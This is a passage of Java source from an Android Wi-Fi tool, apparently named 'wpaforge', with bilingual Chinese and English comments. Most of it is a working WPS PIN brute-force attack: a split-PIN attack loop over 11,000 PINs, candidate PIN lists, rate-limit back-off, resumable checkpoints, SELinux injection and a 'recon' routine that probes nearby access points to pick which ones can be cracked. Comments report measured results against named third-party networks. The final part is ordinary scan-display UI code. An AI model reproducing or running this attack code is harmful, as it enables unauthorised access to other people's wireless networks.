            if (wpsMode == 3) {
                runHalfAttack(bssid);
            } else if (wpsMode <= 2) {
                java.util.List<String> pins = wpsCandidatePins(bssid);
                if (pins.isEmpty()) {
                    wpsLog(L.s("[!] 候选为空 —— 厂商算法对这个 BSSID 没算出结果，"
                                    + "而「我的列表」也还没导入。换个策略或先导入候选。",
                            "[!] No candidates: vendor algorithms produced nothing for this BSSID "
                                    + "and no imported list. Switch strategy or import candidates."));
                } else {
                    wpsLog(L.s("[i] 策略「", "[i] strategy \"") + wpsStrategyName()
                            + L.s("」，候选 ", "\", candidates ") + pins.size() + L.s(" 个", ""));
                    // 分小批跑：每批结束就过一次判定（判死立刻收工，不跑完剩余）
                    for (int i = 0; i < pins.size() && !wpsCancel; i += WPS_WEAK_CHUNK) {
                        if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.shouldStop(wpsSession)) break;
                        int end = Math.min(pins.size(), i + WPS_WEAK_CHUNK);
                        runWpsBatch(pins.subList(i, end));
                    }
                }
            } else {
                while (!wpsCancel && wpsRunning) {
                    java.util.List<String> chunk = io.github.wlmosv_png.wpaforge.wps.WpsPins
                            .enumerateRange(wpsEnumCursor, WPS_BATCH_SIZE);
                    if (chunk.isEmpty()) break;
                    runWpsBatch(chunk);
                    wpsEnumCursor += chunk.size();
                    if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.shouldStop(wpsSession)) break;
                    if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.shouldBackoff(wpsSession)) {
                        wpsLog(L.s("[i] 疑似限流，冷却 60 秒…", "[i] possible rate limit — cooling down 60s…"));
                        for (int i = 0; i < 60 && !wpsCancel; i++) Thread.sleep(1000);
                        wpsSession.consecutiveKick = 0;
                        wpsSession.verdict = io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_RUNNING;
                    }
                }
            }
        } catch (Throwable t) {
            wpsLog("[err] " + t);
        } finally {
            try {
                io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, true);
                wpsLog(L.s("[i] 已恢复自动重连", "[i] auto-join restored"));
            } catch (Throwable ignored) {
            }
            wpsRunning = false;
            runOnUiThread(() -> {
                refreshWpsButtons();
                renderWpsTargets();
                renderWpsModeList();
                refreshWpsProgress();
            });
        }
    }

    /**
     * 拆半攻击主循环。
     *
     * 阶段 1：后 3 位固定 000，穷举前 4 位（10000 次）
     * 阶段 2：前 4 位已确认，穷举后 3 位（1000 次，第 8 位是校验位）
     * 合计 11000 次必然覆盖真 PIN。
     *
     * 判据来自 supplicant 日志：正常错 PIN 时 M2D 之后一路静默到超时；
     * 一旦前 4 位被接受，AP 会回 M3，日志立刻不一样。
     */
    /**
     * 手动添加目标 BSSID。
     *
     * 为什么需要：同一个 SSID 下可能有多个 BSSID，行为完全不同（实测 CMCC-6339 的
     * ...2b 关联 5.8 秒可打，...2c 完全无响应）。而弱信号那个常常一轮扫不到，
     * 结果体检名单里出现的是同名的另一个不可打接口 —— 越测越没结果。
     */
    private void showAddTargetDialog() {
        final EditText in = new EditText(this);
        in.setInputType(android.text.InputType.TYPE_CLASS_TEXT);
        in.setHint(L.s("AA:BB:CC:DD:EE:FF", "AA:BB:CC:DD:EE:FF"));
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("手动添加目标 BSSID", "Add target BSSID"))
                .setMessage(L.s("同名 SSID 可能有多个 BSSID，行为完全不同；"
                                + "弱信号那个常常扫不到，用这个直接指定。",
                        "Same SSID may map to several BSSIDs with different behaviour."))
                .setView(in)
                .setPositiveButton(L.s("添加并查能力", "Add & probe"), (d, w) -> {
                    final String b = in.getText().toString().trim().toLowerCase();
                    if (!b.matches("[0-9a-f]{2}(:[0-9a-f]{2}){5}")) {
                        Toast.makeText(this, L.s("格式不对，要 AA:BB:CC:DD:EE:FF",
                                "Bad format, need AA:BB:CC:DD:EE:FF"), Toast.LENGTH_SHORT).show();
                        return;
                    }
                    new Thread(() -> {
                        io.github.wlmosv_png.wpaforge.wps.WpsController.Info info =
                                io.github.wlmosv_png.wpaforge.wps.WpsController.info(this, b);
                        runOnUiThread(() -> {
                            io.github.wlmosv_png.wpaforge.wps.WpsController.Target t =
                                    new io.github.wlmosv_png.wpaforge.wps.WpsController.Target();
                            t.bssid = b;
                            t.ssid = info.ssid.isEmpty() ? "(手动)" : info.ssid;
                            t.wpsVerdict = info.verdict;
                            t.wpsMethods = info.methods;
                            t.wpsDevice = info.device;
                            t.pairingWindow = info.pairingWindow;
                            t.devPwdId = info.devPwdId;
                            boolean dup = false;
                            for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target x : wpsTargets) {
                                if (x.bssid.equalsIgnoreCase(b)) dup = true;
                            }
                            if (!dup) wpsTargets.add(0, t);
                            wpsPicked = t;
                            wpsWarnedBssid = null;
                            wpsPickedLine.setText(L.s("目标：", "Target: ") + t.describe()
                                    + "   [" + t.capLabel(true) + "]");
                            renderWpsTargets();
                            Toast.makeText(this, L.s("已添加：" + t.capLabel(true),
                                    "Added: " + t.capLabel(false)), Toast.LENGTH_LONG).show();
                        });
                    }, "wps-add-target").start();
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    /** 体检范围按钮的文案。 */
    private void refreshReconScope() {
        if (wpsReconAllBtn == null) return;
        wpsReconAllBtn.setText(wpsReconAll
                ? L.s("体检范围：全部目标（含「不收外部 PIN」的）",
                      "Recon scope: ALL targets")
                : L.s("体检范围：跳过「不收外部 PIN」的（实测那批打不动）",
                      "Recon scope: skip NO-PIN targets"));
    }

    private static final int WPS_RECON_TRY_SEC = 20;
    /**
     * 体检每个目标采样几次。
     * 实测：同一个 AP 三次测量能给出 11.8s / 0ms / 5.3s 三种结果 ——
     * AP 的 WPS 响应是间歇的，单次测量根本定不了性，必须多采几次取最好。
     */
    private static final int WPS_RECON_TRIES = 3;

    /**
     * 目标体检：对每个 WPS AP 各发一次探测 PIN，判断它到底会不会跟我们做 WPS。
     *
     * 这是「不盲跑」的核心：开 WPS ≠ 接受外部 PIN。只有关联能维持 1.5 秒以上
     * （说明真的在跑 EAP-WSC 交换）的目标才值得投入几十小时。
     */
    private void doWpsRecon() {
        if (wpsRunning) {
            Toast.makeText(this, L.s("任务运行中，请先暂停", "Task running - pause first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        if (wpsTargets.isEmpty()) {
            Toast.makeText(this, L.s("请先扫描目标", "Scan targets first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        wpsRunning = true;
        wpsCancel = false;
        wpsLogBuf.setLength(0);
        refreshWpsButtons();
        renderWpsTargets();
        renderWpsModeList();
        new Thread(this::runWpsRecon, "wps-recon").start();
    }

    private void runWpsRecon() {
        try {
            wpsLog(L.s("[i] 目标体检开始：每个 AP 发 " + WPS_RECON_TRIES
                            + " 次 00000000，取最好的一次（AP 的 WPS 响应是间歇的）。",
                    "[i] Recon started: " + WPS_RECON_TRIES + " probe PINs per AP, best of."));
            wpsLog(L.s("[i] 判据：关联 ≥1.5 秒 = 真的在做 WPS（可打）；几百毫秒 = 关联即断。",
                    "[i] Rule: assoc >= 1.5s means real WPS exchange."));
            io.github.wlmosv_png.wpaforge.wps.WpsController.injectSelinux(this);
            io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, false);
            /*
             * 默认跳过 wps_config_methods 不含 KEYPAD/LABEL 的目标。
             *
             * 依据是实测（2026-10-22，每台 3 次采样）：
             *   B227 / B209 / B212（全是 0x2008）→ 0/0/0、202~247ms ×3，全部打不动。
             * 注意它只是「必要不充分」：含 KEYPAD 也不保证能打
             *   （WIFI-8F65 是 0x0380，照样只有 201ms）。
             * 所以我不会拿它反过来证明「能打」—— 能不能打只看体检的实测结果。
             * 想连跳过的也测，点「体检范围」按钮切到全测。
             */
            java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Target> list =
                    new java.util.ArrayList<>();
            int skipped = 0;
            for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg : wpsTargets) {
                if (!wpsReconAll
                        && ("NO_PIN".equals(tg.wpsVerdict) || "LOCKED".equals(tg.wpsVerdict))) {
                    tg.recon = "SKIP";
                    tg.reconDetail = "NO_PIN".equals(tg.wpsVerdict)
                            ? ("config_methods=" + tg.wpsMethods)
                            : L.s("beacon 报 AP Setup Locked", "locked");
                    skipped++;
                    continue;
                }
                list.add(tg);
            }
            // config_methods 不可靠，但可以作为「先测谁」的排序参考：PIN_OK 优先，再按信号
            java.util.Collections.sort(list, (a, b) -> {
                boolean pa = "PIN_OK".equals(a.wpsVerdict);
                boolean pb = "PIN_OK".equals(b.wpsVerdict);
                if (pa != pb) return pa ? -1 : 1;
                return b.rssi - a.rssi;
            });
            wpsLog(L.s("[i] 跳过 " + skipped + " 个目标（声明不收外部 PIN / 已锁定），"
                            + "剩下 " + list.size() + " 个待测。",
                    "[i] Skipped " + skipped + "; testing " + list.size() + "."));
            if (!wpsReconAll) {
                wpsLog(L.s("[i] 跳过依据是实测的：0x2008（显示型）的 3 台 × 3 次采样全部打不动。"
                                + "想连它们一起测就点上面的范围按钮。",
                        "[i] Skip is evidence-based: all 0x2008 targets failed 3/3 samples."));
            }
            int ready = 0;
            for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg : list) {
                if (wpsCancel) break;
                wpsLog("");
                wpsLog("=== " + tg.ssid + "   " + tg.bssid);
                // 多采几次取最好 —— AP 的 WPS 响应是间歇的，单次会骗人
                io.github.wlmosv_png.wpaforge.wps.WpsController.Result best = null;
                StringBuilder tries = new StringBuilder();
                for (int k = 0; k < WPS_RECON_TRIES && !wpsCancel; k++) {
                    io.github.wlmosv_png.wpaforge.wps.WpsController.Result r =
                            io.github.wlmosv_png.wpaforge.wps.WpsController.tryPin(
                                    this, tg.bssid, "00000000", WPS_RECON_TRY_SEC);
                    if (tries.length() > 0) tries.append(" / ");
                    tries.append(r.maxAssocMs).append("ms");
                    if (best == null || r.maxAssocMs > best.maxAssocMs) best = r;
                    if (r.isSuccess()) break;
                    if (r.halfPrefixAccepted()) best = r;
                }
                if (best == null) continue;
                tg.recon = classifyRecon(best);
                tg.reconDetail = best.maxAssocMs + "ms " + best.logKind
                        + L.s("  (采样 ", "  (samples ") + tries + ")";
                if (tg.reconReady()) ready++;
                wpsLog("    " + tg.reconLabel(true) + "   最好关联 " + best.maxAssocMs + "ms"
                        + "   日志 " + best.logKind
                        + L.s("   采样: ", "   samples: ") + tries
                        + (best.apLocked == 1 ? "   [AP 已锁定]" : ""));
                if (best.halfPrefixAccepted()) {
                    wpsLog(L.s("    ★ 探测命中判据 —— 目标极可能可破。",
                            "    * Probe tripped the criterion."));
                }
                runOnUiThread(this::renderWpsTargets);
            }
            wpsLog("");
            wpsLog(L.s("[i] 体检结束：" + ready + " / " + list.size()
                            + " 个目标真的在做 WPS，其余不值得投入。",
                    "[i] Recon done: " + ready + " / " + list.size() + " are really doing WPS."));
        } catch (Throwable t) {
            wpsLog("[err] " + t);
        } finally {
            try {
                io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, true);
            } catch (Throwable ignored) {
            }
            wpsRunning = false;
            runOnUiThread(() -> {
                refreshWpsButtons();
                renderWpsTargets();
                renderWpsModeList();
            });
        }
    }

    /** 体检结论分类。 */
    /**
     * 体检结论分类。
     *
     * 判「可打」用的是双条件：**出现过 WPS 会话（km=WPS）** 且 **关联维持 ≥1.5 秒**。
     * 只看关联时长不够 —— 实测有 AP 关联能到 4.8 秒却没进 WPS 交换（那是偶发假象）。
     * 2026-10-22 五次目标 × 三次采样的实测基线：
     *   CMCC-6339  5671/5426/5367ms + M2D  → READY（抖动 <5%，唯一稳的）
     *   B227       0/0/0ms        + NONE   → 无响应
     *   B209/B212  200~247ms      + M2D    → 关联即断
     *   WIFI-8F65  201/201/201ms  + M2D    → 关联即断（注意它 methods 含 KEYPAD 也没用）
     */
    private String classifyRecon(io.github.wlmosv_png.wpaforge.wps.WpsController.Result r) {
        if (r.isSuccess()) return "HIT";
        if (r.apLocked == 1) return "LOCKED";
        if (r.maxAssocMs >= 1500 && r.wpsSession) return "READY";
        if (r.maxAssocMs >= 1500) return "MAYBE";
        if (r.maxAssocMs > 0) return "INSTANT";
        if (r.apIsTalking()) return "WEAK";
        return "NOWPS";
    }

    private void runHalfAttack(String bssid) {
        if (wpsSession.halfPhase == 0) {
            wpsHalfBssid = bssid;
            loadHalfState(bssid);
            if (wpsSession.halfPhase == 0) wpsSession.halfPhase = 1;
            if (wpsSession.halfCursor > 0) {
                wpsLog(L.s("[i] 从断点续跑：阶段 " + wpsSession.halfPhase
                                + "，已试 " + wpsSession.halfCursor + " 个。",
                        "[i] Resuming from checkpoint: phase " + wpsSession.halfPhase
                                + " at " + wpsSession.halfCursor + "."));
            }
        }
        wpsLog(L.s("[i] 拆半攻击：阶段 1 穷举前 4 位（10000 次），阶段 2 穷举后 3 位（1000 次）。",
                "[i] Half-PIN attack: phase 1 = 10k prefixes, phase 2 = 1k suffixes."));
        while (!wpsCancel && wpsRunning) {
            if (wpsSession.halfPhase == 2) {
                int start = wpsSession.halfCursor;
                java.util.List<String> pins = new java.util.ArrayList<>();
                for (int i = start; i < Math.min(1000, start + WPS_WEAK_CHUNK); i++) {
                    String p = io.github.wlmosv_png.wpaforge.wps.WpsCandidates
                            .stage2Pin(wpsSession.halfPrefix, i);
                    if (p != null) pins.add(p);
                }
                if (pins.isEmpty()) {
                    wpsLog(L.s("[x] 前 4 位 " + wpsSession.halfPrefix + " 验证失败 → 回阶段 1 继续。",
                            "[x] prefix " + wpsSession.halfPrefix + " failed -> back to phase 1."));
                    wpsSession.halfPhase = 1;
                    wpsSession.halfPrefix = "";
                    wpsSession.halfCursor = wpsHalfCursor1;
                    saveHalfState();
                    continue;
                }
                runWpsBatch(pins);
                wpsSession.halfCursor += pins.size();
                saveHalfState();
            } else {
                int start = wpsSession.halfCursor;
                java.util.List<String> pins = new java.util.ArrayList<>();
                for (int i = start; i < Math.min(10000, start + WPS_WEAK_CHUNK); i++) {
                    String p = io.github.wlmosv_png.wpaforge.wps.WpsCandidates.stage1Pin(i);
                    if (p != null) pins.add(p);
                }
                if (pins.isEmpty()) {
                    wpsLog(L.s("[!] 阶段 1 已试完全部 10000 个前 4 位，仍未找到。",
                            "[!] phase 1 exhausted all 10000 prefixes."));
                    break;
                }
                runWpsBatch(pins);
                wpsSession.halfCursor += pins.size();
                wpsHalfCursor1 = wpsSession.halfCursor;
                saveHalfState();
                if (wpsSession.halfPrefixHit) {
                    wpsLog(L.s("[*] 前 4 位候选：" + wpsSession.halfPrefix + " → 进入阶段 2。",
                            "[*] prefix candidate " + wpsSession.halfPrefix + " -> phase 2."));
                    wpsSession.halfPhase = 2;
                    wpsSession.halfCursor = 0;
                    wpsSession.halfPrefixHit = false;
                    saveHalfState();
                }
            }
            runOnUiThread(MainActivity.this::refreshWpsProgress);
            if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_HIT.equals(wpsSession.verdict)) break;
        }
    }

    /**
     * 主按钮三态：开始 / 暂停 / 继续。
     * 有断点（且是同一个目标、且不是从头）时显示「继续」，避免用户以为要重跑一遍。
     */
    private void refreshWpsButtons() {
        if (wpsStartBtn == null) return;
        if (wpsRunning) {
            wpsStartBtn.setText(L.s("暂停", "Pause"));
            wpsStartBtn.setEnabled(true);
            wpsStopBtn.setEnabled(false);
        } else {
            boolean has = hasWpsCheckpoint();
            wpsStartBtn.setText(has ? L.s("继续", "Resume") : L.s("开始", "Start"));
            wpsStartBtn.setEnabled(true);
            wpsStopBtn.setEnabled(has);
        }
        if (wpsModeList != null) {
            for (int i = 0; i < wpsModeList.getChildCount(); i++) {
                wpsModeList.getChildAt(i).setEnabled(!wpsRunning);
            }
        }
        if (wpsTargetList != null) {
            for (int i = 0; i < wpsTargetList.getChildCount(); i++) {
                wpsTargetList.getChildAt(i).setEnabled(!wpsRunning);
            }
        }
    }

    /** 是否存在可续跑的断点（拆半进度）。 */
    private boolean hasWpsCheckpoint() {
        try {
            android.content.SharedPreferences p = getPreferences(MODE_PRIVATE);
            String b = p.getString("wpsHalfBssid", "");
            int c = p.getInt("wpsHalfCursor", 0);
            int ph = p.getInt("wpsHalfPhase", 0);
            int c1 = p.getInt("wpsHalfCursor1", 0);
            return !b.isEmpty() && (c > 0 || c1 > 0 || ph == 2);
        } catch (Throwable t) {
            return false;
        }
    }

    /** 清空进度，回到「开始」。 */
    private void resetWps() {
        if (wpsRunning) {
            wpsCancel = true;
        }
        try {
            android.content.SharedPreferences.Editor e = getPreferences(MODE_PRIVATE).edit();
            e.remove("wpsHalfBssid");
            e.remove("wpsHalfPhase");
            e.remove("wpsHalfCursor");
            e.remove("wpsHalfCursor1");
            e.remove("wpsHalfPrefix");
            e.apply();
        } catch (Throwable ignored) {
        }
        wpsHalfCursor1 = 0;
        wpsSession = null;
        wpsEnumCursor = 0;
        refreshWpsProgress();
        refreshWpsButtons();
        Toast.makeText(this, L.s("进度已重置", "Progress reset"), Toast.LENGTH_SHORT).show();
    }

    private void runWpsBatch(java.util.List<String> pins) {
        if (pins.isEmpty()) return;
        wpsLog(L.s("[i] 尝试 ", "[i] trying ") + pins.size()
                + L.s(" 个候选：", " candidates: ") + pins.get(0) + " …");
        java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Result> rs =
                io.github.wlmosv_png.wpaforge.wps.WpsController.batch(
                        this, wpsPicked.bssid, pins, WPS_PER_TRY_SEC, WPS_BATCH_BUDGET,
                        new io.github.wlmosv_png.wpaforge.wps.WpsController.Listener() {
                            @Override
                            public void onLine(String line) {
                            }

                            @Override
                            public void onResult(io.github.wlmosv_png.wpaforge.wps.WpsController.Result r) {
                                io.github.wlmosv_png.wpaforge.wps.WpsEngine.observe(wpsSession,
                                        new io.github.wlmosv_png.wpaforge.wps.WpsEngine.Attempt(r));
                                boolean wasTalking = wpsSession != null && wpsSession.everWpsSession;
                                boolean wasReal = wpsSession != null && wpsSession.everRealWps;
                                boolean zhR = L.s("a", "b").equals("a");
                                wpsLog("  " + r.pin + "  " + r.label(zhR)
                                        + "  " + r.elapsedMs + "ms"
                                        + (r.wpsSession ? "  [WPS]" : "")
                                        + "  assoc=" + r.assocCount + "/" + r.maxAssocMs + "ms");
                                if (r.halfPrefixAccepted() && wpsSession != null
                                        && wpsSession.halfPhase == 1 && r.pin.length() >= 4) {
                                    wpsSession.halfPrefix = r.pin.substring(0, 4);
                                    wpsSession.halfPrefixHit = true;
                                }
                                if (!wasReal && wpsSession != null && wpsSession.everRealWps) {
                                    wpsLog(L.s("  ★★ 真实 WPS 交换确认（关联 "
                                                    + String.format(java.util.Locale.US, "%.1f", r.maxAssocMs / 1000.0)
                                                    + "s）—— 这是有效目标，把候选跑完。",
                                            "  ★★ Real WPS exchange confirmed - valid target, run the list."));
                                } else if (!wasTalking && wpsSession != null && wpsSession.everWpsSession) {
                                    wpsLog(L.s("  · 只看到瞬时关联（" + r.maxAssocMs
                                                    + "ms），该 AP 多半没在等配对。",
                                            "  \u00b7 Only a brief association - AP probably not pairing."));
                                }
                                runOnUiThread(MainActivity.this::refreshWpsProgress);
                            }

                            @Override
                            public boolean isCancelled() {
                                return wpsCancel;
                            }
                        });
        if (rs.isEmpty() && !wpsCancel) {
            wpsLog(L.s("[w] 本批没有返回结果（助手进程可能没起来）",
                    "[w] no results from this batch"));
        }
        runOnUiThread(MainActivity.this::refreshWpsProgress);
    }

    /**
     * 观测页 —— Obsidian Amber 重构。
     *
     * <h3>结构（自上而下六段）</h3>
     * <pre>
     *   ① 扫描卡      雷达 + 中心大数字（N 个网络）
     *   ② 侦察入口    局域网设备探测（保留原入口与回调）
     *   ③ 信号分布    柱状图卡
     *   ④ 信道占用    占用条 + 信道建议卡（标题单独一行）
     *   ⑤ 本机已存    一行卡片，点开看详情（回调不变）
     *   ⑥ 发现网络    筛选片（选中态实心琥珀）+ 卡片化列表 / 空状态
     * </pre>
     *
     * <p>数据来源、筛选语义、扫描频率与全部回调**与改版前一致**；这一版只重排布局、
     * 统一配色与尺寸，并把「当前生效的筛选」显示出来（改版前筛选片没有选中态）。
     */
    /**
     * 刷新雷达卡头部：状态文案 + 按钮可用性。
     *
     * <p>三种状态：能扫（按钮可点）／冷却中（按钮变暗，文案给出秒数）／
     * 上次被系统拒（文案说明是"系统限制了频率"，不是软件坏了）。
     */
    private void updateRadarStatus() {
        if (radarStatus == null) return;
        long now = System.currentTimeMillis();
        StringBuilder sb = new StringBuilder();
        long last = scanner == null ? 0 : scanner.lastResultsAt();
        if (last <= 0) {
            sb.append(L.s("正在扫描…", "Scanning\u2026"));
        } else {
            long sec = Math.max(0, (now - last) / 1000);
            sb.append(sec <= 3
                    ? L.s("刚刚更新", "Updated just now")
                    : L.s("最后更新 " + sec + " 秒前", "Updated " + sec + "s ago"));
            if (lastDiff != null && lastDiff.changed()) {
                sb.append(" · ").append(lastDiff.label(" · "));
            }
        }
        String text = sb.toString();
        if (!text.contentEquals(radarStatus.getText())) radarStatus.setText(text);
    }

    /**
     * 雷达图例：五档信号色 + dBm 区间，并说明实心/空心＝2.4G/5G。
     *
     * <p>刻度值不在这里另写一份 —— 从 {@link RadarSweep#ringLabels()} 取，
     * 与盘上画环用的是同一组常量。
     */
    private View radarLegend() {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setPadding(0, px(10), 0, 0);

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        String[] labels = RadarSweep.ringLabels();
        int[] colors = RadarSweep.ringColors();
        TextView cap = new TextView(this);
        cap.setText(L.s("由内到外：", "Inner to outer: "));
        cap.setTextSize(10.5f);
        cap.setTextColor(AmberTheme.TEXT_FAINT);
        row.addView(cap);
        // ringLabels() 是按「由外到内」排的（下标 0 = 最外环 = 最弱），
        // 这里**倒着显示**，读序才和「由内到外」的说明对得上
        for (int i = labels.length - 1; i >= 0; i--) {
            row.addView(legendChip(labels[i], colors[i]));
        }
        box.addView(row);

        TextView band = new TextView(this);
        band.setText(L.s("● 实心 = 2.4G    ○ 空心 = 5G    圆心 = 信号最强",
                "● filled = 2.4G    ○ hollow = 5G    centre = strongest"));
        band.setTextSize(10.5f);
        band.setTextColor(AmberTheme.TEXT_FAINT);
        band.setPadding(0, px(5), 0, 0);
        box.addView(band);
        return box;
    }

    /** 图例里的一格：小圆点 + dBm 文字 */
    private View legendChip(String label, int color) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.HORIZONTAL);
        box.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = px(9);
        box.setLayoutParams(lp);

        View dot = new View(this);
        android.graphics.drawable.GradientDrawable g = new android.graphics.drawable.GradientDrawable();
        g.setShape(android.graphics.drawable.GradientDrawable.OVAL);
        g.setColor(color);
        dot.setBackground(g);
        box.addView(dot, new LinearLayout.LayoutParams(px(8), px(8)));

        TextView t = new TextView(this);
        t.setText(label);
        t.setTextSize(10.5f);
        t.setTextColor(AmberTheme.TEXT_DIM);
        LinearLayout.LayoutParams tlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        tlp.leftMargin = px(4);
        box.addView(t, tlp);
        return box;
    }

    /**
     * 雷达卡的关键数字：频段分布 / 最挤的信道 / 未加密台数。
     *
     * <p>这三个数是**从雷达盘上读不出来、但看盘的人一定会问**的问题：
     * 「几个是 5G 的」「哪条信道最挤」「有几个连密码都没有」。
     */
    private void renderRadarStats(List<NetRecord> nets) {
        if (radarStatsBox == null) return;
        radarStatsBox.removeAllViews();
        int n24 = 0, n5 = 0, open = 0;
        int bestRssi = Integer.MIN_VALUE;
        int[] perChannel = new int[200];
        for (NetRecord r : nets) {
            if (r.is5Ghz) n5++;
            else n24++;
            if (r.security == NetRecord.Security.OPEN || r.security == NetRecord.Security.WEP) open++;
            bestRssi = Math.max(bestRssi, r.rssi);
            if (!r.is5Ghz && r.channel > 0 && r.channel < perChannel.length) perChannel[r.channel]++;
        }
        int busiest = 0, busiestN = 0;
        for (int ch = 1; ch <= 14; ch++) {
            if (perChannel[ch] > busiestN) {
                busiestN = perChannel[ch];
                busiest = ch;
            }
        }
        radarStatsBox.addView(statCell(L.s("2.4G", "2.4G"), n24 + L.s(" 台", "")));
        radarStatsBox.addView(statCell(L.s("5G", "5G"), n5 + L.s(" 台", "")));
        // 这一格最容易被挤爆：去掉「台」这种会顶到边上的字，
        // 数值一律用「ch 6 · 3」的短写法
        radarStatsBox.addView(statCellWide(L.s("最挤", "Busiest"),
                busiestN > 0 ? "ch " + busiest + " \u00b7 " + busiestN : "\u2014"));
        radarStatsBox.addView(statCell(L.s("未加密", "Open"), open + L.s(" 台", "")));
        radarStatsBox.addView(statCell(L.s("最强", "Best"),
                bestRssi == Integer.MIN_VALUE ? "\u2014" : bestRssi + " dBm"));
    }

    /** 「最挤」那格再宽一点（内容最长） */
    private View statCellWide(String label, String value) {
        LinearLayout box = (LinearLayout) statCell(label, value);
        LinearLayout.LayoutParams lp = (LinearLayout.LayoutParams) box.getLayoutParams();
        lp.weight = 1.35f;
        return box;
    }

    /** 关键数字的一格：上面小标签、下面数值 */
    private View statCell(String label, String value) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setLayoutParams(new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        TextView l = new TextView(this);
        l.setText(label);
        l.setTextSize(10f);
        l.setTextColor(AmberTheme.TEXT_FAINT);
        TextView v = new TextView(this);
        v.setText(value);
        v.setTextSize(13f);
        v.setTextColor(AmberTheme.TEXT);
        v.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        v.setSingleLine(true);
        v.setEllipsize(android.text.TextUtils.TruncateAt.END);
        box.addView(l);
        box.addView(v);
        return box;
    }

    private void buildObserveTab() {
        // ① 扫描卡：雷达放进卡片，中心数字仍由 RadarSweep 自己画
        LinearLayout radarCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        radar = new RadarSweep(this);
        // 头部行：左＝状态（最后更新 / 系统限流倒计时），右＝重新扫描。
        // 系统对 startScan 有约 30 秒的频率限制，按钮必须**如实反映**能不能按，
        // 否则用户点了没反应，只会以为软件坏了。
        radarStatus = new TextView(this);
        radarStatus.setTextSize(11.5f);
        radarStatus.setTextColor(AmberTheme.TEXT_DIM);
        radarStatus.setSingleLine(true);
        radarStatus.setEllipsize(android.text.TextUtils.TruncateAt.END);
        radarStatus.setGravity(Gravity.CENTER_VERTICAL);
        radarStatus.setPadding(px(2), px(2), px(2), px(8));
        LinearLayout.LayoutParams hlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        hlp.bottomMargin = px(4);
        radarStatus.setLayoutParams(hlp);
        radarCard.addView(radarStatus);

        radarCard.addView(radar, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(224)));
        radar.setCenterText(L.s("扫描中", "Scanning"),
                L.s("正在探测周边网络", "Probing nearby networks"));
        // 雷达盘上只留信道标（盘面太窄，文字和点抢位置怎么调都是输），
        // dBm 刻度与频段含义做成盘下的图例；再配一行关键数字，
        // 免得这张卡除了一个圆盘之外什么都没说。
        radarCard.addView(radarLegend());
        radarStatsBox = new LinearLayout(this);
        radarStatsBox.setOrientation(LinearLayout.HORIZONTAL);
        radarStatsBox.setPadding(0, px(8), 0, 0);
        radarCard.addView(radarStatsBox);
        LinearLayout.LayoutParams rcp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rcp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(radarCard, rcp);

        observeNotice = new TextView(this);
        observeNotice.setTextSize(AmberTheme.FS_BODY);
        observeNotice.setTextColor(DANGER);
        observeNotice.setLineSpacing(px(4), 1f);
        observeNotice.setBackground(roundBg(AmberTheme.DANGER_SOFT_BG, AmberTheme.RADIUS_CARD));
        observeNotice.setPadding(px(14), px(12), px(14), px(12));
        observeNotice.setVisibility(View.GONE);
        LinearLayout.LayoutParams onlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        onlp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(observeNotice, onlp);

        // ② 网络侦察入口：终端式局域网设备探测（需 root）。
        // 大胶囊按钮改为**卡片行**（标题 + 副标题 + ›）：与设置页/审计页同一套行结构，
        // 页面上不再出现"一个占满屏幕宽度的按钮"。回调与入口一字未改。
        LinearLayout reconCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        LinearLayout reconRow = new LinearLayout(this);
        reconRow.setOrientation(LinearLayout.VERTICAL);
        reconRow.setBackground(io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(
                AmberTheme.CARD, dp(AmberTheme.RADIUS_CHIP)));
        reconRow.setPadding(0, px(2), 0, px(2));
        reconCard.addView(reconRow);

        TextView reconTitle = new TextView(this);
        reconTitle.setText(L.s("网络侦察", "LAN recon") + "   ›");
        reconTitle.setTextSize(AmberTheme.FS_BODY + 1f);
        reconTitle.setTextColor(TEXT);
        reconTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        reconRow.addView(reconTitle);

        TextView reconSub = new TextView(this);
